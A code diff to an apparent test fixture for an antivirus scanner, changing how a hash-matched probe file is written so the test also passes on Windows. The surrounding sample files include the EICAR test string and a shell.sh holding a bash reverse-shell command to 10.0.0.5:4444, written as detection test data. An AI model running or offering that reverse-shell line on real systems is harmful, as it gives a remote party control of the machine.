@@ -72,7 +72,12 @@ def samples(tmp_path):
     eicar = "X5O!P%@AP[4\\PZX54(P^)7CC)7}$" + "EICAR-STANDARD-ANTIVIRUS-TEST-FILE" + "!$H+H*"
     (directory / "eicar.com").write_text(eicar)
 
-    (directory / "probe.txt").write_text("GUARDIANTUS-AV-SIGNATURE-SELFTEST-FILE-DO-NOT-REMOVE\n")
+    # Written as bytes on purpose: this file is matched by its SHA-256, and
+    # write_text() would turn the newline into CRLF on Windows and change the
+    # digest, so the hash-signature test could never pass there.
+    (directory / "probe.txt").write_bytes(
+        b"GUARDIANTUS-AV-SIGNATURE-SELFTEST-FILE-DO-NOT-REMOVE\n"
+    )
 
     (directory / "shell.sh").write_text("#!/bin/bash\nbash -i >& /dev/tcp/10.0.0.5/4444 0>&1\n")
 
